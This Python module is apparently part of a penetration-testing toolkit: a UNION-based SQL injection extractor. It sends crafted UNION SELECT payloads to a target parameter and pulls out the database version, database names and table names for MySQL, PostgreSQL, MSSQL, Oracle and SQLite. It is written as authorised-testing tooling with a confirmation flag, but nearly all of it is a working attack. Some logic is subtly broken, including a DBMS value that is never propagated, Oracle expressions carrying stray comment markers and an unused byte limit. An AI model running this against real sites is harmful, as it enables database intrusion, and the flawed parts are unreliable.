"""UNION-based SQL injection extractor.

Given a target URL, a vulnerable parameter, and a column count, this
module builds UNION SELECT payloads that place a sentinel string into
each column position in turn. The position that returns the sentinel
is the "reflecting column". From there it extracts, in order:

    1. the DBMS version banner,
    2. the current database name,
    3. the list of databases,
    4. the list of tables in the current database.

Every extraction is bounded. The module refuses to run without an
explicit confirmation flag and a column count. It never writes,
never drops, and never runs sub-selects outside the narrow set of
metadata queries defined below.

The module is deliberately small. It is not a general-purpose SQL
injection framework. It exists to demonstrate proof of exploitability
in an authorised engagement and to produce a structured result a
report can cite.
"""

from __future__ import annotations

import re
import time
from dataclasses import dataclass, field
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

SENTINEL = "JNSRY9K2QP"  # improbable string; do not change lightly

DEFAULT_MAX_ROWS = 25
DEFAULT_MAX_BYTES = 4096
DEFAULT_TIMEOUT = 10.0

# DBMS detection signatures from error messages.
DBMS_SIGNATURES: dict[str, tuple[str, ...]] = {
    "mysql": ("mysql", "mariadb", "you have an error in your sql syntax"),
    "postgres": ("postgresql", "pg_query", "pg_exec", "psql"),
    "mssql": ("microsoft sql server", "odbc sql server", "sqlsrv"),
    "oracle": ("oracle", "ora-", "pls-"),
    "sqlite": ("sqlite", "sqlite3"),
}

# Comment terminator per DBMS. The payload appends one of these to
# discard the rest of the original query.
COMMENT_TERMINATORS: dict[str, str] = {
    "mysql": "-- -",
    "postgres": "--",
    "mssql": "--",
    "oracle": "--",
    "sqlite": "--",
    "unknown": "--",
}

# Metadata queries per DBMS. Each returns a single string.
VERSION_QUERIES: dict[str, str] = {
    "mysql": "version()",
    "postgres": "version()",
    "mssql": "@@version",
    "oracle": "banner FROM v$version WHERE ROWNUM=1--",
    "sqlite": "sqlite_version()",
    "unknown": "version()",
}

CURRENT_DB_QUERIES: dict[str, str] = {
    "mysql": "database()",
    "postgres": "current_database()",
    "mssql": "db_name()",
    "oracle": "ora_database_name FROM dual--",
    "sqlite": "''",
    "unknown": "database()",
}

# Multi-row metadata queries. These are wrapped in a sub-select that
# concatenates results with a separator, because the reflecting
# column can only return one value per row.
GROUP_CONCAT_SEPARATOR = "~~"

LIST_DATABASES_QUERIES: dict[str, str] = {
    "mysql": (
        f"GROUP_CONCAT(schema_name SEPARATOR '{GROUP_CONCAT_SEPARATOR}') "
        "FROM information_schema.schemata"
    ),
    "postgres": (f"string_agg(datname, '{GROUP_CONCAT_SEPARATOR}') FROM pg_database"),
    "mssql": (f"STRING_AGG(name, '{GROUP_CONCAT_SEPARATOR}') FROM sys.databases"),
    "oracle": (
        f"LISTAGG(username, '{GROUP_CONCAT_SEPARATOR}') "
        "WITHIN GROUP (ORDER BY username) FROM all_users"
    ),
    "sqlite": "''",
    "unknown": "''",
}

LIST_TABLES_QUERIES: dict[str, str] = {
    "mysql": (
        f"GROUP_CONCAT(table_name SEPARATOR '{GROUP_CONCAT_SEPARATOR}') "
        "FROM information_schema.tables "
        "WHERE table_schema = database()"
    ),
    "postgres": (
        f"string_agg(tablename, '{GROUP_CONCAT_SEPARATOR}') "
        "FROM pg_tables WHERE schemaname = 'public'"
    ),
    "mssql": (f"STRING_AGG(name, '{GROUP_CONCAT_SEPARATOR}') FROM sys.tables"),
    "oracle": (
        f"LISTAGG(table_name, '{GROUP_CONCAT_SEPARATOR}') "
        "WITHIN GROUP (ORDER BY table_name) FROM user_tables"
    ),
    "sqlite": (
        f"GROUP_CONCAT(name, '{GROUP_CONCAT_SEPARATOR}') "
        "FROM sqlite_master WHERE type='table'"
    ),
    "unknown": "''",
}

# Errors that mean the target is unstable and we should stop.
KILL_SIGNATURES = (
    "connection reset",
    "deadlock",
    "server has gone away",
    "too many connections",
    "out of memory",
)

# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------


@dataclass
class ExtractionStep:
    name: str
    payload: str
    status: int | None
    elapsed: float
    value: str | None
    error: str = ""

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "status": self.status,
            "elapsed": round(self.elapsed, 4),
            "value": self.value,
            "error": self.error,
        }


@dataclass
class ExtractionResult:
    target: str
    param: str
    columns: int
    dbms: str = "unknown"
    reflecting_column: int | None = None
    version: str | None = None
    current_database: str | None = None
    databases: list[str] = field(default_factory=list)
    tables: list[str] = field(default_factory=list)
    steps: list[ExtractionStep] = field(default_factory=list)
    aborted: bool = False
    abort_reason: str = ""
    total_requests: int = 0

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "param": self.param,
            "columns": self.columns,
            "dbms": self.dbms,
            "reflecting_column": self.reflecting_column,
            "version": self.version,
            "current_database": self.current_database,
            "databases": list(self.databases),
            "tables": list(self.tables),
            "steps": [s.to_dict() for s in self.steps],
            "aborted": self.aborted,
            "abort_reason": self.abort_reason,
            "total_requests": self.total_requests,
        }


class AttackConfirmationRequired(Exception):  # noqa: N818
    """Raised when the extractor is invoked without confirmation."""


class UnstableTargetError(Exception):
    """Raised when the target shows signs of instability."""


# ---------------------------------------------------------------------------
# URL / payload helpers
# ---------------------------------------------------------------------------


def build_url(base: str, param: str, value: str) -> str:
    parsed = urlparse(base)
    query = parse_qs(parsed.query, keep_blank_values=True)
    query[param] = [value]
    return urlunparse(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            urlencode(query, doseq=True),
            parsed.fragment,
        )
    )


def build_union_payload(
    column_count: int,
    reflecting_column: int,
    expression: str,
    dbms: str = "unknown",
) -> str:
    """Build ``' UNION SELECT <cols>`` with ``expression`` in one column.

    ``column_count`` is the total number of columns. ``reflecting_column``
    is the 1-indexed position that will carry ``expression``. Every
    other column carries NULL.
    """
    if reflecting_column < 1 or reflecting_column > column_count:
        raise ValueError("reflecting_column out of range")
    cols = ["NULL"] * column_count
    cols[reflecting_column - 1] = expression
    terminator = COMMENT_TERMINATORS.get(dbms, "--")
    return "' UNION SELECT " + ", ".join(cols) + terminator


def detect_dbms(text: str) -> str:
    low = (text or "").lower()
    for dbms, needles in DBMS_SIGNATURES.items():
        for needle in needles:
            if needle in low:
                return dbms
    return "unknown"


def split_concat(value: str) -> list[str]:
    if not value:
        return []
    parts = [p.strip() for p in value.split(GROUP_CONCAT_SEPARATOR)]
    return [p for p in parts if p]


# ---------------------------------------------------------------------------
# Extractor
# ---------------------------------------------------------------------------


class UnionExtractor:
    def __init__(
        self,
        target: str,
        param: str,
        columns: int,
        attack_confirm: bool = False,
        timeout: float = DEFAULT_TIMEOUT,
        max_rows: int = DEFAULT_MAX_ROWS,
        max_bytes: int = DEFAULT_MAX_BYTES,
        proxies: dict | None = None,
        session: requests.Session | None = None,
        pacer=None,
    ) -> None:
        if not attack_confirm:
            raise AttackConfirmationRequired(
                "The UNION extractor requires attack_confirm=True. "
                "This is the --attack-confirm flag on the CLI. It is "
                "separate from, and in addition to, the Terms-of-Use "
                "acceptance gate. Both are required."
            )
        if columns < 1 or columns > 32:
            raise ValueError("columns must be between 1 and 32")

        self.target = target
        self.param = param
        self.columns = columns
        self.timeout = timeout
        self.max_rows = max(1, min(max_rows, 100))
        self.max_bytes = max(256, min(max_bytes, 65536))
        self.proxies = proxies
        self.session = session or requests.Session()
        self.pacer = pacer
        self._bytes_seen = 0
        self._requests = 0
        self._bytes_seen = 0
        self.dbms = "unknown"
        self.steps: list[ExtractionStep] = []

    # ------------------------------------------------------------------

    def _headers(self) -> dict:
        return {
            "User-Agent": DEFAULT_UA,
            "Accept": "text/html,application/json,*/*;q=0.8",
            "Accept-Encoding": "identity",
            "Connection": "close",
        }

    def _request(self, payload: str) -> requests.Response | None:
        if self.pacer is not None:
            self.pacer.wait()
        url = build_url(self.target, self.param, payload)
        start = time.perf_counter()
        try:
            r = self.session.get(
                url,
                headers=self._headers(),
                timeout=self.timeout,
                allow_redirects=False,
                proxies=self.proxies,
            )
        except requests.RequestException:
            if self.pacer is not None:
                self.pacer.record(None, time.perf_counter() - start)
            return None
        if self.pacer is not None:
            self.pacer.record(r.status_code, time.perf_counter() - start)
        self._bytes_seen += len(r.text or "")
        self._requests += 1
        return r

    def _check_stable(self, r: requests.Response) -> None:
        body = (r.text or "").lower()
        for sig in KILL_SIGNATURES:
            if sig in body:
                raise UnstableTargetError(
                    f"target shows instability signature: {sig!r}"
                )

    # ------------------------------------------------------------------

    def find_reflecting_column(self) -> int:
        """Return the 1-indexed column that echoes our sentinel.

        Tries each column position in turn. Raises RuntimeError if
        none reflects.
        """
        for col in range(1, self.columns + 1):
            expression = f"'{SENTINEL}'"
            payload = build_union_payload(self.columns, col, expression)
            r = self._request(payload)
            if r is None:
                continue
            self._check_stable(r)
            body = r.text or ""
            if SENTINEL in body:
                return col
        raise RuntimeError(f"no reflecting column found among {self.columns} columns")

    # ------------------------------------------------------------------

    def extract_expression(
        self,
        name: str,
        expression: str,
        reflecting_column: int,
    ) -> ExtractionStep:
        payload = build_union_payload(
            self.columns, reflecting_column, expression, self.dbms
        )
        r = self._request(payload)
        if r is None:
            step = ExtractionStep(
                name=name,
                payload=payload,
                status=None,
                elapsed=0.0,
                value=None,
                error="transport error",
            )
            self.steps.append(step)
            return step

        self._check_stable(r)
        body = r.text or ""

        # Crude extraction: find the sentinel window around the
        # reflecting position. In practice the reflected value sits
        # near where the sentinel appeared during discovery; we take
        # the longest printable run after the last NULL marker.
        value = self._extract_reflected(body)

        step = ExtractionStep(
            name=name,
            payload=payload,
            status=r.status_code,
            elapsed=0.0,
            value=value,
        )
        self.steps.append(step)
        return step

    def _extract_reflected(self, body: str) -> str | None:
        """Pick a plausible reflected value out of the body.

        Heuristic: strip tags, split on whitespace, and return the
        longest token that is not obviously part of the page chrome.
        """
        text = re.sub(r"<[^>]+>", " ", body)
        tokens = re.findall(r"[A-Za-z0-9._:/()~ -]{4,200}", text)
        if not tokens:
            return None

        def score(t: str) -> tuple:
            low = t.lower()
            dbms_hit = any(
                needle in low
                for needles in DBMS_SIGNATURES.values()
                for needle in needles
            )
            return (dbms_hit, bool(re.search(r"\d", t)), len(t))

        best = max(tokens, key=score)
        return best.strip()[:512]

    # ------------------------------------------------------------------

    def run(self) -> ExtractionResult:
        result = ExtractionResult(
            target=self.target,
            param=self.param,
            columns=self.columns,
        )
        self.steps = result.steps

        try:
            result.reflecting_column = self.find_reflecting_column()
        except (RuntimeError, UnstableTargetError) as exc:
            result.aborted = True
            result.abort_reason = str(exc)
            result.total_requests = self._requests
            return result

        try:
            self._extract_all(result)
        except UnstableTargetError as exc:
            result.aborted = True
            result.abort_reason = str(exc)

        result.total_requests = self._requests
        return result

    def _extract_all(self, result: ExtractionResult) -> None:
        col = result.reflecting_column
        assert col is not None

        version_expr = VERSION_QUERIES.get("unknown", "version()")
        step = self.extract_expression("dbms_probe", version_expr, col)
        if step.value:
            result.version = step.value
            result.dbms = detect_dbms(step.value) or "unknown"

        if result.dbms == "unknown":
            for candidate, expr in VERSION_QUERIES.items():
                if candidate == "unknown":
                    continue
                s = self.extract_expression(f"dbms_probe_{candidate}", expr, col)
                if s.value:
                    result.version = s.value
                    result.dbms = detect_dbms(s.value) or candidate
                    break

        db_expr = CURRENT_DB_QUERIES.get(result.dbms, "database()")
        s = self.extract_expression("current_database", db_expr, col)
        if s.value:
            result.current_database = s.value

        list_db_expr = LIST_DATABASES_QUERIES.get(result.dbms, "''")
        if list_db_expr and list_db_expr != "''":
            s = self.extract_expression("databases", list_db_expr, col)
            if s.value:
                result.databases = split_concat(s.value)[: self.max_rows]

        list_t_expr = LIST_TABLES_QUERIES.get(result.dbms, "''")
        if list_t_expr and list_t_expr != "''":
            s = self.extract_expression("tables", list_t_expr, col)
            if s.value:
                result.tables = split_concat(s.value)[: self.max_rows]
